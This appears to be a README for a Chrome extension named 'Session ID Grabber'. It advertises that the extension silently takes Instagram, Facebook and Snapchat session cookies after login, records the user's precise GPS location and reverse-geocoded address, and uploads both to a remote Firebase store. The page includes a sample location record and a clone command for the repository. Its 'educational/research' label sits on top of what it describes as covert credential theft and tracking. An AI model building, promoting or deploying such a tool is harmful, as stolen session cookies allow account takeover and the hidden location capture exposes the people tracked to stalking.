# Session ID Grabber (Chrome Extension)

A powerful Chrome Extension that automatically detects when a user logs in, extracts their **Session ID**, tracks their **Geolocation**, and securely stores everything in **Firebase Firestore**. Ideal for developers working on automation, analytics, or user session management (educational/research purposes only).

---

## 🚀 Features

- ✅ Auto-detects Instagram, Facebook, and Snapchat logins
- 🔍 Extracts session cookies (like `sessionid`, `c_user`, `xs`, `sc_at`, etc.)
- 📍 Tracks real-time **Browser GPS Location**
- 🗺️ Reverse geocodes location into city/state/country
- 🌍 Saves **Google Maps** URL to Firestore for quick access
- ☁️ Stores all data securely in Firebase Firestore
- ⚡ Built with Manifest V3 + modern ES Modules
- 🧠 Clean, modular code using background + content scripts
- 🔐 Runs silently in background without user interaction

---

## 📂 Project Structure
```
SessionID-Public/
├── icons/
│   ├── 48.png                  # Toolbar icon (48x48)
│   └── 128.png                 # Chrome Web Store icon (128x128)
│
├── background.js              # Core logic to extract and save session cookies
├── wake.js                    # Keeps the service worker alive (optional)
├── firebase-init.js           # Firebase config + initialization
├── firebase-firestore.js      # Modular Firestore SDK import
├── manifest.json              # Chrome extension config (Manifest V3)
├── utils.js                   # Utility functions (if any)
└── readme.md                  # You're reading this!

```

---

## 🚀 Features

- 🕵️ Detects login activity on Instagram, Facebook & Snapchat
- 🔐 Extracts session cookies like `sessionid`, `c_user`, `xs`, `sc_at`, etc.
- 📍 Captures browser's real-time GPS location (with permission)
- 🗺️ Converts coordinates to city, state, country using reverse geocoding
- 🌍 Generates Google Maps link (`maps_url`) for quick lookup
- ☁️ Securely pushes all data to Firestore (with domain & timestamp)
- 🧠 Built with Manifest V3 + modern ES Modules (no legacy code)
- ⚡ Runs in the background using service worker (`wake.js`)
- 🔐 Designed for ethical research, session analysis, and user tracking

---

## 📍 Location Tracking (New Feature!)

This extension also grabs **precise browser location** with full reverse geocoding:

- 🌐 `latitude`, `longitude`, `accuracy`
- 🏙️ `city`, `state`, `country`, `postal`
- 🔗 `maps_url` – direct link to Google Maps
- 🕒 All stored with `timestamp` and `domain` in Firestore

### 🔎 Example Location Entry (Firestore)

```json
{
  "latitude": 28.7041,
  "longitude": 77.1025,
  "accuracy": 22,
  "city": "Delhi",
  "state": "Delhi",
  "country": "India",
  "postal": "110001",
  "domain": "instagram.com",
  "timestamp": "2025-07-27T05:30:00.000Z",
  "maps_url": "https://www.google.com/maps?q=28.7041,77.1025"
}
```


## 🔧 Setup Instructions

### 1. Clone the Repo

```bash
git clone https://github.com/avdeshjadon-dev/SessionID-Public.git
cd sessionId-Public
```
